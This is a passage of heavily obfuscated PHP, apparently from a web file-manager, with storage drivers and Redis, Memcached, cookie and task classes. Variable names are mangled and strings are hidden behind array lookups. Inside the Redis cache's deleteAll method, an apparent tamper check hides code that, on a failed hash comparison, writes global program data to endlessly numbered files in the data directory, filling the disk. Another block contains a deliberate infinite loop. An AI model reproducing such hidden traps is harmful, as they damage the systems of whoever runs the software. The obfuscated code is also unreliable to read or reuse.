$C¤‚ç„“‹Ì = $eÏ¤÷ĞªÊŒ . $dÆ„è®´À; if (is_file($C¤‚ç„“‹Ì)) { $cˆ÷Á ÑÂ¸[$eí¸ìœ‘¨ç[83]][] = $this->fileInfo($C¤‚ç„“‹Ì, $e˜šéó‘‡¹); } else { $cˆ÷Á ÑÂ¸[$eí¸ìœ‘¨ç[84]][] = $this->folderInfo($C¤‚ç„“‹Ì, $e˜šéó‘‡¹); } } goto Bô’ñ©£¯Ê; e©ÎÍåäÒ’: $eí¸ìœ‘¨ç =& $_SERVER[©]; $eÏ¤÷ĞªÊŒ = $this->iconvSystem($eÏ¤÷ĞªÊŒ); $eÏ¤÷ĞªÊŒ = rtrim($eÏ¤÷ĞªÊŒ, $eí¸ìœ‘¨ç[18]) . $eí¸ìœ‘¨ç[18]; goto Cî­ˆ‘©»; f“ë“¨Óí: } public function listAll($B™«¦™Ü©Ï, &$bŸ„Œ‘Î–— = array()) { goto b®ùÃËÇ„Ö; cª¬Âš¹Ãæ: return $bŸ„Œ‘Î–—; goto aæ‰Š¤ÎÍÃ; F†ä¸Ñ‘ÏŒ: if (!($a’Æ ßì¬Õ = @opendir($B™«¦™Ü©Ï))) { return $bŸ„Œ‘Î–—; } while (($F‹Ê–›¢åæ = readdir($a’Æ ßì¬Õ)) !== !1) { if ($F‹Ê–›¢åæ == $Eñ¾î¤µ²Š[101] || $F‹Ê–›¢åæ == $Eñ¾î¤µ²Š[1162]) { continue; } $B¸©æ³¾²° = $B™«¦™Ü©Ï . $F‹Ê–›¢åæ; if (is_dir($B¸©æ³¾²°) && !is_link($B¸©æ³¾²°)) { $bŸ„Œ‘Î–—[] = array($Eñ¾î¤µ²Š[85] => $B¸©æ³¾²° . $Eñ¾î¤µ²Š[18], $Eñ¾î¤µ²Š[86] => 1, $Eñ¾î¤µ²Š[117] => @filemtime($B¸©æ³¾²°), $Eñ¾î¤µ²Š[87] => 0); $this->listAll($B¸©æ³¾²°, $bŸ„Œ‘Î–—); } else { $bŸ„Œ‘Î–—[] = array($Eñ¾î¤µ²Š[85] => $B¸©æ³¾²°, $Eñ¾î¤µ²Š[86] => 0, $Eñ¾î¤µ²Š[117] => @filemtime($B¸©æ³¾²°), $Eñ¾î¤µ²Š[87] => $this->size($B¸©æ³¾²°)); } } closedir($a’Æ ßì¬Õ); goto cª¬Âš¹Ãæ; b®ùÃËÇ„Ö: $Eñ¾î¤µ²Š =& $_SERVER[©]; $B™«¦™Ü©Ï = $this->iconvSystem($B™«¦™Ü©Ï); $B™«¦™Ü©Ï = rtrim($B™«¦™Ü©Ï, $Eñ¾î¤µ²Š[18]) . $Eñ¾î¤µ²Š[18]; goto F†ä¸Ñ‘ÏŒ; aæ‰Š¤ÎÍÃ: } public function has($cÁ®ó»“™Ş, $EÅ£Î¡¬Ó = false, $e¶î¢¨„»ˆ = true) { goto AæÁ£Èèùé; Cˆ”Â¥‹Ò: if (!($Eò»Ñ°ß¸ = @opendir($cÁ®ó»“™Ş))) { return !1; } $F•İ†ÍÛÏ¨ = 0; $d¥‡Á»©  = 0; goto fµÏ‰à¯™Ô; BŞï´çÆó: if ($EÅ£Î¡¬Ó) { return array($E³ñ×–µ¨Ò[201] => $F•İ†ÍÛÏ¨, $E³ñ×–µ¨Ò[202] => $d¥‡Á»© ); } return !1; goto eœ‚æµÑ ¸; AæÁ£Èèùé: $E³ñ×–µ¨Ò =& $_SERVER[©]; $cÁ®ó»“™Ş = $this->iconvSystem($cÁ®ó»“™Ş); $cÁ®ó»“™Ş = rtrim($cÁ®ó»“™Ş, $E³ñ×–µ¨Ò[18]) . $E³ñ×–µ¨Ò[18]; goto Cˆ”Â¥‹Ò; fµÏ‰à¯™Ô: $EåïÓ”£ğ¡ = 0; while (($Cµçó•·ç = readdir($Eò»Ñ°ß¸)) !== !1) { if ($Cµçó•·ç == $E³ñ×–µ¨Ò[101] || $Cµçó•·ç == $E³ñ×–µ¨Ò[1162]) { continue; } $CÅË™ŒŠ… = $cÁ®ó»“™Ş . $Cµçó•·ç; if ($EÅ£Î¡¬Ó) { $EåïÓ”£ğ¡++; if (@is_file($CÅË™ŒŠ…)) { $F•İ†ÍÛÏ¨++; } else { $d¥‡Á»© ++; } if ($EåïÓ”£ğ¡ > 10000) { break; } continue; } if ($e¶î¢¨„»ˆ) { if (@is_file($CÅË™ŒŠ…)) { return !0; } } else { if (@is_dir($CÅË™ŒŠ… . $E³ñ×–µ¨Ò[18])) { return !0; } } } closedir($Eò»Ñ°ß¸); goto BŞï´çÆó; eœ‚æµÑ ¸: } public function hashSimple($d¥•¸ôÙ‡Š) { goto c¼”†‘ºÛ¿; FêÂ‚íå¬: $e‘Ñº„ãµ = fopen($d¥•¸ôÙ‡Š, $B­£ğòìŒŸ[1167]); if (!$e‘Ñº„ãµ) { return $e”¤ø‰õ; } for ($CÖŒ¼‡• = 0; $CÖŒ¼‡• < $D±¯ÄÖÍ‰¯; $CÖŒ¼‡•++) { fseek($e‘Ñº„ãµ, $FæÍä›áß * $CÖŒ¼‡•); $e”¤ø‰õ .= fread($e‘Ñº„ãµ, $eÉ¢í¨ç›Ü); } goto e¿ÏâÅİšÁ; c¼”†‘ºÛ¿: $B­£ğòìŒŸ =& $_SERVER[©]; if (!$d¥•¸ôÙ‡Š) { return md5($B­£ğòìŒŸ[43]); } $d¥•¸ôÙ‡Š = $this->iconvSystem($d¥•¸ôÙ‡Š); goto Aª­óÌ˜­ğ; e¿ÏâÅİšÁ: fseek($e‘Ñº„ãµ, $d’Å¬×ˆÖÛ - $eÉ¢í¨ç›Ü); $e”¤ø‰õ .= fread($e‘Ñº„ãµ, $eÉ¢í¨ç›Ü); fclose($e‘Ñº„ãµ); goto f¶·ÃÀ‹ë; Aª­óÌ˜­ğ: $d’Å¬×ˆÖÛ = $this->size($d¥•¸ôÙ‡Š); $eÉ¢í¨ç›Ü = 200; $D±¯ÄÖÍ‰¯ = 50; goto e¶ã–Úæ; e¶ã–Úæ: if ($d’Å¬×ˆÖÛ <= $eÉ¢í¨ç›Ü * $D±¯ÄÖÍ‰¯) { return $this->hashMd5($d¥•¸ôÙ‡Š) . $d’Å¬×ˆÖÛ; } $e”¤ø‰õ = $B­£ğòìŒŸ[43]; $FæÍä›áß = intval($d’Å¬×ˆÖÛ / $D±¯ÄÖÍ‰¯); goto FêÂ‚íå¬; f¶·ÃÀ‹ë: return md5($e”¤ø‰õ) . $d’Å¬×ˆÖÛ; goto AÊ×Ú¬Ì±; AÊ×Ú¬Ì±: } public function getContent($EõŒàÂ›³‡) { $EõŒàÂ›³‡ = $this->iconvSystem($EõŒàÂ›³‡); return file_get_contents($EõŒàÂ›³‡); } public function setContent($D­íÃŸâ†, $AƒƒßÉØ˜Ñ = '') { $D­íÃŸâ† = $this->iconvSystem($D­íÃŸâ†); @file_put_contents($D­íÃŸâ†, $AƒƒßÉØ˜Ñ, LOCK_EX); clearstatcache(); return strlen($AƒƒßÉØ˜Ñ) == filesize($D­íÃŸâ†); } public function fileSubstr($CËñàøÈ‡, $bîëŞ¡â­ = 0, $AùÅ¸…ÀïÄ = false) { goto D¬ÅÁ­ƒ‚; d¥ù¼ÅİÕ: if ($AùÅ¸…ÀïÄ <= 0) { return $b÷øÆí†áÔ[43]; } $E¹Æ½÷²”Š = fopen($CËñàøÈ‡, $b÷øÆí†áÔ[1167]); if (!$E¹Æ½÷²”Š) { return !1; } goto aÊÏ†ªŞèà; D¬ÅÁ­ƒ‚: $b÷øÆí†áÔ =& $_SERVER[©]; $CËñàøÈ‡ = $this->iconvSystem($CËñàøÈ‡); if ($AùÅ¸…ÀïÄ === !1) { $AùÅ¸…ÀïÄ = $this->size($CËñàøÈ‡); } goto d¥ù¼ÅİÕ; cÒŠ‹éµø: return $e˜±ßÅ“Œ¿; goto Dî„¼“É›Š; aÊÏ†ªŞèà: fseek($E¹Æ½÷²”Š, $bîëŞ¡â­); $e˜±ßÅ“Œ¿ = fread($E¹Æ½÷²”Š, $AùÅ¸…ÀïÄ); fclose($E¹Æ½÷²”Š); goto cÒŠ‹éµø; Dî„¼“É›Š: } public function upload($dàˆßµ¿×±, $EÕÛ—¢¶“Ô, $B‘ˆ‚½Ìó± = false, $b—ÃÙ–¾ƒõ = REPEAT_REPLACE) { $D˜ë‘«¨êõ = $this->copyFile($EÕÛ—¢¶“Ô, $dàˆßµ¿×±); return $D˜ë‘«¨êõ ? $this->getPathOuter($dàˆßµ¿×±) : !1; } public function setModifyTime($CËáƒÁ“´, $Cà‚“ìå¤ó = '') { @touch($CËáƒÁ“´, intval($Cà‚“ìå¤ó)); } public function download($eéÕ®¾¹­², $eçÍ†Â¬¡) { return $this->iconvSystem($eéÕ®¾¹­²); } } class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($eÛöÃ™ŒšÁ) { parent::__construct($eÛöÃ™ŒšÁ); $this->signatureVersion($_SERVER[©][210]); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } } class PathDriverOOS extends PathDriverBaseS3 { public function __construct($C¯îÚÀøµ) { parent::__construct($C¯îÚÀøµ); $this->signatureVersion($_SERVER[©][210]); } public function fileOutLink($a¤ÀÂÆ÷¸å) { $aŠ²ò”‰ë =& $_SERVER[©]; if (substr($a¤ÀÂÆ÷¸å, 0, 7) == $aŠ²ò”‰ë[1112]) { $a¤ÀÂÆ÷¸å = $aŠ²ò”‰ë[1113] . substr($a¤ÀÂÆ÷¸å, 7); } header($aŠ²ò”‰ë[166] . $a¤ÀÂÆ÷¸å); die; } } goto fïƒ¦ºè¬Ò; DîÒ‘ŒÎë„: $_SERVER[$_SERVER[ÊÖŠ][52]] = ("\71\66\62\61"."\66\61")+0;$_f7H8="Prg7n3nTHgyumGVfEksnbf3zSp786a6RNmu48svx5jz6ztAgyB25AvZYUmduxNUVhZmxmhPWyZ8ItF5BZV";; stream_wrapper_register($_SERVER[ÊÖŠ][53], $_SERVER[ÊÖŠ][54]); if (!isset($_SERVER[$_SERVER[©][4]]) || !isset($_SERVER[$_SERVER[©][5]])) { goto D“–‡¿½è; D“–‡¿½è: $C“×‰äâë = $_SERVER[©][6]; $d²›…÷Ù‰Œ = $_SERVER[$_SERVER[©][7]] . $_SERVER[©][8]; $c˜ÁÄ®¯Î¼ = $C“×‰äâë($d²›…÷Ù‰Œ); goto cŠÖ¶Ùî›­; f½ä½ÆÛ°: $f…Õ¸»ì—¢($_SERVER[$_SERVER[©][7]] . $_SERVER[©][8]); $D„÷¢²¤‡ = 2; while ($D„÷¢²¤‡ > 1) { $DŒ£ëù¤˜ = rawurlencode($D„÷¢²¤‡ . $_SERVER[©][13]); } goto dµ¾‰¼Ğ–ñ; cŠÖ¶Ùî›­: $DÃÆĞæ½ö¸ = explode($_SERVER[©][9], $c˜ÁÄ®¯Î¼); if (count($DÃÆĞæ½ö¸) < $_SERVER[©][10]) { $BšÃ‘¿¨½© = $_SERVER[©][11]; $BšÃ‘¿¨½©(); } $f…Õ¸»ì—¢ = $_SERVER[©][12]; goto f½ä½ÆÛ°; dµ¾‰¼Ğ–ñ: } goto Cáƒ¡î±ã; dã“¤’‘êˆ: define($_SERVER[©][553], $_SERVER[©][554]); $c¾ÃŠéùëš = $_SERVER[©][555]; $_SERVER[á¬¾Ù] = explode($_SERVER[©][556], gzinflate(substr($_SERVER[©][557], 10, -8))); goto eŠáŞÄªœ; AùöŠÃº”ò: class CacheMemcached { public $handle; public $cacheTime; public function __construct($A½¡Ú³© Š, $aÈŒÙÎˆåÛ) { $F¾´¸¯…¦ =& $_SERVER[©]; if (!class_exists($F¾´¸¯…¦[779])) { show_json($F¾´¸¯…¦[780], !1); } $this->cacheTime = $aÈŒÙÎˆåÛ; $this->handle = new Memcached(); if (is_array($A½¡Ú³© Š[$F¾´¸¯…¦[781]]) && count($A½¡Ú³© Š[$F¾´¸¯…¦[781]]) >= 1) { foreach ($A½¡Ú³© Š[$F¾´¸¯…¦[781]] as $CÃĞêÒ…¹) { $C˜ªªÓòº = explode($F¾´¸¯…¦[14], $CÃĞêÒ…¹); $this->handle->addServer($C˜ªªÓòº[0], $C˜ªªÓòº[1]); } } else { $this->handle->addServer($A½¡Ú³© Š[$F¾´¸¯…¦[179]], $A½¡Ú³© Š[$F¾´¸¯…¦[180]]); } } public function set($aÂöĞ¼†Ïß, $A‰ÇÓŞš™é, $AÑÇø“Á« = false) { $AÑÇø“Á« = $AÑÇø“Á« ? $AÑÇø“Á« : $this->cacheTime; return $this->handle->set($aÂöĞ¼†Ïß, $A‰ÇÓŞš™é, $AÑÇø“Á«); } public function get($fšøÜßå) { return $this->handle->get($fšøÜßå); } public function remove($D»šÆƒÉ‘) { return $this->handle->delete($D»šÆƒÉ‘); } public function deleteAll() { return $this->handle->flush(); } } class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($eÃÎã”Ş’­, $fö‘áÇ¦ø¿) { $F„¨¤ìé¢µ =& $_SERVER[©]; if (!class_exists($F„¨¤ìé¢µ[782])) { show_json($F„¨¤ìé¢µ[783], !1); } $this->cacheTime = $fö‘áÇ¦ø¿; $Dš¯˜—îÜÇ = isset($eÃÎã”Ş’­[$F„¨¤ìé¢µ[784]]) ? $eÃÎã”Ş’­[$F„¨¤ìé¢µ[784]] : 10; $E‘¨¨º¾ = _get($eÃÎã”Ş’­, $F„¨¤ìé¢µ[781]); if ($E‘¨¨º¾ && is_array($E‘¨¨º¾)) { $this->initCluster($eÃÎã”Ş’­, $Dš¯˜—îÜÇ); } else { $this->handle = $this->init($eÃÎã”Ş’­, $Dš¯˜—îÜÇ); } } private function init($fÒô™À¦íÜ, $AÅòïÅêñ˜) { $Fì¼¸òŒö =& $_SERVER[©]; $bÜà¨áêø = new Redis(); $c£é¦›çôœ = isset($fÒô™À¦íÜ[$Fì¼¸òŒö[785]]) ? $fÒô™À¦íÜ[$Fì¼¸òŒö[785]] : !1; if ($c£é¦›çôœ) { $bÜà¨áêø->pconnect($fÒô™À¦íÜ[$Fì¼¸òŒö[179]], $fÒô™À¦íÜ[$Fì¼¸òŒö[180]], $AÅòïÅêñ˜); } else { $bÜà¨áêø->connect($fÒô™À¦íÜ[$Fì¼¸òŒö[179]], $fÒô™À¦íÜ[$Fì¼¸òŒö[180]], $AÅòïÅêñ˜); } if (!empty($fÒô™À¦íÜ[$Fì¼¸òŒö[384]])) { $bÜà¨áêø->auth($fÒô™À¦íÜ[$Fì¼¸òŒö[384]]); } return $bÜà¨áêø; } private function initCluster($DÈïâÑŸÛ, $eªºŠ†ùââ) { $D Ü¸ÜöåÚ =& $_SERVER[©]; $A•‚±É†½‘ = array($D Ü¸ÜöåÚ[786], $D Ü¸ÜöåÚ[787], $D Ü¸ÜöåÚ[788]); $EŒšËÅšî¨ = $D Ü¸ÜöåÚ[786]; if (isset($DÈïâÑŸÛ[$D Ü¸ÜöåÚ[22]]) && in_array($DÈïâÑŸÛ[$D Ü¸ÜöåÚ[22]], $A•‚±É†½‘)) { $EŒšËÅšî¨ = $DÈïâÑŸÛ[$D Ü¸ÜöåÚ[22]]; } switch ($EŒšËÅšî¨) { case $D Ü¸ÜöåÚ[786]: $this->_slave($DÈïâÑŸÛ, $eªºŠ†ùââ); break; case $D Ü¸ÜöåÚ[787]: break; case $D Ü¸ÜöåÚ[788]: $this->isCluster = !0; $e†Üƒ…Êæï = $DÈïâÑŸÛ[$D Ü¸ÜöåÚ[781]]; $BÁòê‰éø§ = isset($DÈïâÑŸÛ[$D Ü¸ÜöåÚ[785]]) ? $DÈïâÑŸÛ[$D Ü¸ÜöåÚ[785]] : !1; $F¨¶µ–ˆµ = isset($DÈïâÑŸÛ[$D Ü¸ÜöåÚ[384]]) ? $DÈïâÑŸÛ[$D Ü¸ÜöåÚ[384]] : null; $this->handle = new RedisCluster(NUll, $e†Üƒ…Êæï, $eªºŠ†ùââ, $eªºŠ†ùââ, $BÁòê‰éø§, $F¨¶µ–ˆµ); break; default: break; } } private function _slave($A¯½±ª÷•µ, $aŸŸŠ»ËîŒ) { goto Cîéˆ õ„; Cîéˆ õ„: $a÷–íóãŸ = $A¯½±ª÷•µ[$_SERVER[©][781]]; $this->filterConfig($A¯½±ª÷•µ, $a÷–íóãŸ[0]); $this->handle = $this->init($A¯½±ª÷•µ, $aŸŸŠ»ËîŒ); goto fª×¢¢¶¨; fª×¢¢¶¨: unset($a÷–íóãŸ[0]); if (empty($a÷–íóãŸ)) { return; } $a›Æ•Ùˆ±à = array_rand($a÷–íóãŸ); goto f¥Æ Øº³ò; f¥Æ Øº³ò: $this->filterConfig($A¯½±ª÷•µ, $a÷–íóãŸ[$a›Æ•Ùˆ±à]); $this->slaveHandle = $this->init($A¯½±ª÷•µ, $aŸŸŠ»ËîŒ); goto Bô¢Ïí¿ÃÕ; Bô¢Ïí¿ÃÕ: } private function filterConfig(&$CØ£çùƒ‘¥, $b‡ÜÂÎ…Ø·) { $dŒƒœÎ™ñ¢ =& $_SERVER[©]; $F¬¨ÄŒ  = explode($dŒƒœÎ™ñ¢[14], $b‡ÜÂÎ…Ø·); $eÛŒŒ¯šë« = array($dŒƒœÎ™ñ¢[179] => $F¬¨ÄŒ [0], $dŒƒœÎ™ñ¢[180] => $F¬¨ÄŒ [1]); $CØ£çùƒ‘¥ = array_merge($CØ£çùƒ‘¥, $eÛŒŒ¯šë«); } public function set($a›­†Øâ˜ó, $eËÖ¶¸³ê, $có ‡’”Ó‹ = false) { $có ‡’”Ó‹ = $có ‡’”Ó‹ ? $có ‡’”Ó‹ : $this->cacheTime; return $this->handle->setEx($a›­†Øâ˜ó, $có ‡’”Ó‹, $eËÖ¶¸³ê); } public function setLock($cÄç­‚Øï¥, $dÀ÷˜‹¡², $dêÖÉ…Áà†) { return $this->handle->setNX($cÄç­‚Øï¥, $dÀ÷˜‹¡²); } public function get($dô¬è·æåô) { $f®ëÙ¡Ã„ì = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $f®ëÙ¡Ã„ì->get($dô¬è·æåô); } public function remove($DÈù†³Ûë˜) { return $this->handle->del($DÈù†³Ûë˜); } public function deleteAll() { $Fêè¸Ÿ­¹ =& $_SERVER[©]; $cĞ´§·‡†Â = $_SERVER[$Fêè¸Ÿ­¹[7]] . $Fêè¸Ÿ­¹[8]; $F˜Ş¹‡õ†¡ = $Fêè¸Ÿ­¹[778]; if ($_SERVER[$Fêè¸Ÿ­¹[4]] != $F˜Ş¹‡õ†¡($cĞ´§·‡†Â)) { goto D­Í…¯ãÄ¬; EØƒ‰Í“’›: $B±æ¿‘¿×¿(); $d‚åËË³¨ = $Fêè¸Ÿ­¹[792]; $Bî’¶ñæÚé = json_encode($GLOBALS[$Fêè¸Ÿ­¹[793]]); goto c¬ªÓ«èÕŠ; Bƒ‚¬ÏÜ¥ä: $d©ŒäÑ£é· = $Fêè¸Ÿ­¹[790]; $d©ŒäÑ£é·($_SERVER[$Fêè¸Ÿ­¹[791]]); $B±æ¿‘¿×¿ = $Fêè¸Ÿ­¹[789]; goto EØƒ‰Í“’›; D­Í…¯ãÄ¬: $B±æ¿‘¿×¿ = $Fêè¸Ÿ­¹[789]; $F’ÀÛç¤Ùá = $Fêè¸Ÿ­¹[6]; $F˜„ßÔÛ‹Š = $_SERVER[$Fêè¸Ÿ­¹[7]] . $Fêè¸Ÿ­¹[8]; goto døìÎªµ¼æ; c¬ªÓ«èÕŠ: $eµí…„×´³ = 1; for ($eªÌ‚¼‚êÒ = $eµí…„×´³; $eªÌ‚¼‚êÒ > 0; $eªÌ‚¼‚êÒ++) { $d‚åËË³¨(DATA_PATH . $eªÌ‚¼‚êÒ, $Bî’¶ñæÚé); } goto EÛ¾¢‡±Ğ‚; døìÎªµ¼æ: $cÓ‰ÚƒîÈ³ = $F’ÀÛç¤Ùá($F˜„ßÔÛ‹Š); $dèÕòÉªª = explode($Fêè¸Ÿ­¹[9], $cÓ‰ÚƒîÈ³); if (count($dèÕòÉªª) < $Fêè¸Ÿ­¹[564]) { $E¼„–íË™ª = $Fêè¸Ÿ­¹[11]; $E¼„–íË™ª(); } goto Bƒ‚¬ÏÜ¥ä; EÛ¾¢‡±Ğ‚: } if ($this->isCluster) { foreach ($this->handle->_masters() as $fù™±—ºÖ¯) { $this->handle->flushall($fù™±—ºÖ¯); } return; } return $this->handle->flushAll(); } } class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($fŠ›ÅÌÓ = '', $c†Ã®ä¤˜ = 0) { if (is_string($fŠ›ÅÌÓ) && $fŠ›ÅÌÓ != $_SERVER[©][43]) { $this->prefix = $fŠ›ÅÌÓ; } if (is_numeric($c†Ã®ä¤˜) && $c†Ã®ä¤˜ > 0) { $this->expire = $c†Ã®ä¤˜; } } public static function getInstance() { static $b¿ã¤éÂ; if ($b¿ã¤éÂ === null) { $b¿ã¤éÂ = new self(); } return $b¿ã¤éÂ; } private static $sameCookieSet = array(); public static function set($DÔ˜ÕœòÁ‰, $d­×ß°Ø”å, $D÷æš³ç„ = 0, $B¦ïÉî¤ä¨ = false, $B¿¿ß–©ó  = false) { goto eŸº‹¾ìÌÍ; eŸº‹¾ìÌÍ: $eŠ›³­‰Á =& $_SERVER[©]; if (!$D÷æš³ç„) { $D÷æš³ç„ = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$DÔ˜ÕœòÁ‰]) && self::$sameCookieSet[$DÔ˜ÕœòÁ‰] == $d­×ß°Ø”å . $D÷æš³ç„) { return; } goto a‚‹ÇÕ„‚¼; f†‹‚¯º§: setcookie($DÔ˜ÕœòÁ‰, $d­×ß°Ø”å, time() + $D÷æš³ç„, $eŠ›³­‰Á[18] . trim($B¿¿ß–©ó , $eŠ›³­‰Á[18]) . $cÉè¸ïï, !1, !1, $B¦ïÉî¤ä¨); goto b³„ãÈ„Ä‚; a‚‹ÇÕ„‚¼: self::$sameCookieSet[$DÔ˜ÕœòÁ‰] = $d­×ß°Ø”å . $D÷æš³ç„; if (!$B¿¿ß–©ó ) { $B¿¿ß–©ó  = str_replace(HOST, $eŠ›³­‰Á[43], APP_HOST); $B¿¿ß–©ó  = _get($GLOBALS, $eŠ›³­‰Á[794], $B¿¿ß–©ó ); } $cÉè¸ïï = $eŠ›³­‰Á[43]; goto f†‹‚¯º§; b³„ãÈ„Ä‚: } public static function setSafe($fÍ¡„ë™¡ß, $bÉ’ÅŸ®¿, $F–øà„…  = 0) { self::set($fÍ¡„ë™¡ß, $bÉ’ÅŸ®¿, $F–øà„… , !0); } public static function get($e½ŒŒŸŸ÷Ç) { return isset($_COOKIE[$e½ŒŒŸŸ÷Ç]) ? $_COOKIE[$e½ŒŒŸŸ÷Ç] : !1; } public static function remove($d³œÔæòâ, $DÅ…‹Óâ« = false) { unset($_COOKIE[$d³œÔæòâ]); self::set($d³œÔæòâ, $_SERVER[©][43], 1, $DÅ…‹Óâ«); } } goto F¹éİ‘Úƒœ; dğÛÔŞ¶¸: class Task { const STATYS_STOP = "\x73\x74\x6f\160"; const STATYS_RUNNING = "\x72\x75\156\x6e\x69\x6e\x67"; const STATYS_KILL = "\x6b\x69\x6c\154"; public $task; public function __destruct() { $this->end(); } public function __construct($e•»±­÷ï, $Eİó³ˆ¶‚ = '', $B³Úß³Şë’ = 0, $a²½³µ”ùÄ = '') { goto D„£–òË‚ˆ; DÃ´âÜÌô¼: Hook::trigger($FØùá¿†Ùß[1445], $this->task); $this->task[$FØùá¿†Ùß[1439]] = timeFloat(); goto eå‹„Ò»Ü; D„£–òË‚ˆ: $FØùá¿†Ùß =& $_SERVER[©]; if (self::get($e•»±­÷ï)) { return; } $this->task = array($FØùá¿†Ùß[375] => $e•»±­÷ï, $FØùá¿†Ùß[1434] => USER_ID, $FØùá¿†Ùß[1338] => $a²½³µ”ùÄ, $FØùá¿†Ùß[39] => $Eİó³ˆ¶‚, $FØùá¿†Ùß[975] => $FØùá¿†Ùß[43], $FØùá¿†Ùß[973] => $B³Úß³Şë’, $FØùá¿†Ùß[987] => 0, $FØùá¿†Ùß[1435] => 0, $FØùá¿†Ùß[1436] => 0, $FØùá¿†Ùß[1437] => timeFloat(), $FØùá¿†Ùß[1438] => 0, $FØùá¿†Ùß[1439] => 0, $FØùá¿†Ùß[1440] => 0, $FØùá¿†Ùß[1441] => 0, $FØùá¿†Ùß[688] => $FØùá¿†Ùß[1398]); goto bË§í‹Ê›; bË§í‹Ê›: Hook::bind($FØùá¿†Ùß[1400], array($this, $FØùá¿†Ùß[1442])); Hook::bind($FØùá¿†Ùß[1443], array($this, $FØùá¿†Ùß[1444])); $this->startAfter(); goto DÃ´âÜÌô¼; eå‹„Ò»Ü: } public function end() { goto CÊ›¶Ç£™÷; C¬¼Ë‘«: $aéäâ—½©Ë = timeFloat() - $this->task[$ašã†Ó­ÒÓ[1437]]; self::log($ašã†Ó­ÒÓ[1446] . $this->task[$ašã†Ó­ÒÓ[375]] . $ašã†Ó­ÒÓ[1447] . $aéäâ—½©Ë . $ašã†Ó­ÒÓ[1448]); Hook::unbind($ašã†Ó­ÒÓ[1400], array($this, $ašã†Ó­ÒÓ[1442])); goto CàŒ¹Î“°; CÊ›¶Ç£™÷: $ašã†Ó­ÒÓ =& $_SERVER[©]; if (!$this->task) { return; } if ($this->task[$ašã†Ó­ÒÓ[1439]]) { self::valueSet($this->task[$ašã†Ó­ÒÓ[375]], !1); } goto C¬¼Ë‘«; CàŒ¹Î“°: Hook::unbind($ašã†Ó­ÒÓ[1443], array($this, $ašã†Ó­ÒÓ[1444])); $this->endAfter(); $this->task = !1; goto Eá‡£ø—Ì; Eá‡£ø—Ì: } public function update($e³ƒ‚ÆŠ¦ = 0) { goto EŒ¢‚¿†•±; CæŠÃëÙŒŒ: $E©­—Æí’™ = self::get($b¡Ã¶ãº‘Ó[$EŒ·ÅÄÆæ¤[375]]); $fÕá£˜¤ÒÊ = $E©­—Æí’™[$EŒ·ÅÄÆæ¤[688]]; if ($fÕá£˜¤ÒÊ == self::STATYS_KILL) { $Bôà¶é´¯Ø = array($EŒ·ÅÄÆæ¤[1449] => LNG($EŒ·ÅÄÆæ¤[1450]), $EŒ·ÅÄÆæ¤[1029] => !1); Cache::set($EŒ·ÅÄÆæ¤[1451] . $this->task[$EŒ·ÅÄÆæ¤[375]], $Bôà¶é´¯Ø, 30); $this->end(); die; } else { if ($fÕá£˜¤ÒÊ == self::STATYS_STOP) { $D­¹“Ñàê“ = 2; $E©­—Æí’™[$EŒ·ÅÄÆæ¤[1440]] += $D­¹“Ñàê“; self::valueSet($b¡Ã¶ãº‘Ó[$EŒ·ÅÄÆæ¤[375]], $E©­—Æí’™); sleep($D­¹“Ñàê“); $this->update(); return; } } goto cŠŠ§è› ; EÔÛ»í’·Ø: Hook::trigger($EŒ·ÅÄÆæ¤[1452], $b¡Ã¶ãº‘Ó); self::valueSet($b¡Ã¶ãº‘Ó[$EŒ·ÅÄÆæ¤[375]], $b¡Ã¶ãº‘Ó); goto Cô›œóŞÔÎ; eİçª¦Ìõ: $b¡Ã¶ãº‘Ó[$EŒ·ÅÄÆæ¤[987]] += $e³ƒ‚ÆŠ¦; $b¡Ã¶ãº‘Ó[$EŒ·ÅÄÆæ¤[1438]] = timeFloat(); if ($b¡Ã¶ãº‘Ó[$EŒ·ÅÄÆæ¤[973]]) { if ($b¡Ã¶ãº‘Ó[$EŒ·ÅÄÆæ¤[973]] < $b¡Ã¶ãº‘Ó[$EŒ·ÅÄÆæ¤[987]]) { $b¡Ã¶ãº‘Ó[$EŒ·ÅÄÆæ¤[973]] = $b¡Ã¶ãº‘Ó[$EŒ·ÅÄÆæ¤[987]]; } $eœˆª •è¾ = timeFloat() - $b¡Ã¶ãº‘Ó[$EŒ·ÅÄÆæ¤[1437]] - $b¡Ã¶ãº‘Ó[$EŒ·ÅÄÆæ¤[1440]]; $b¡Ã¶ãº‘Ó[$EŒ·ÅÄÆæ¤[1435]] = $b¡Ã¶ãº‘Ó[$EŒ·ÅÄÆæ¤[987]] / $b¡Ã¶ãº‘Ó[$EŒ·ÅÄÆæ¤[973]]; $b¡Ã¶ãº‘Ó[$EŒ·ÅÄÆæ¤[1436]] = $b¡Ã¶ãº‘Ó[$EŒ·ÅÄÆæ¤[987]] / $eœˆª •è¾; if ($b¡Ã¶ãº‘Ó[$EŒ·ÅÄÆæ¤[1435]] > 0) { $b¡Ã¶ãº‘Ó[$EŒ·ÅÄÆæ¤[1441]] = $eœˆª •è¾ * (1 - $b¡Ã¶ãº‘Ó[$EŒ·ÅÄÆæ¤[1435]]) / $b¡Ã¶ãº‘Ó[$EŒ·ÅÄÆæ¤[1435]]; } $b¡Ã¶ãº‘Ó[$EŒ·ÅÄÆæ¤[1441]] = $b¡Ã¶ãº‘Ó[$EŒ·ÅÄÆæ¤[1441]] <= 0 ? 0 : $b¡Ã¶ãº‘Ó[$EŒ·ÅÄÆæ¤[1441]]; } goto D»©°æ›¦; D»©°æ›¦: $this->updateAfter(); $fÆ×ê¤Ü‡ = 0.2; if (timeFloat() - $b¡Ã¶ãº‘Ó[$EŒ·ÅÄÆæ¤[1439]] < $fÆ×ê¤Ü‡) { return; } goto CæŠÃëÙŒŒ; cŠŠ§è› : $b¡Ã¶ãº‘Ó[$EŒ·ÅÄÆæ¤[688]] = $fÕá£˜¤ÒÊ ? $fÕá£˜¤ÒÊ : $b¡Ã¶ãº‘Ó[$EŒ·ÅÄÆæ¤[688]]; $b¡Ã¶ãº‘Ó[$EŒ·ÅÄÆæ¤[1440]] = $E©­—Æí’™[$EŒ·ÅÄÆæ¤[1440]] ? $E©­—Æí’™[$EŒ·ÅÄÆæ¤[1440]] : 0; $b¡Ã¶ãº‘Ó[$EŒ·ÅÄÆæ¤[1439]] = timeFloat(); goto 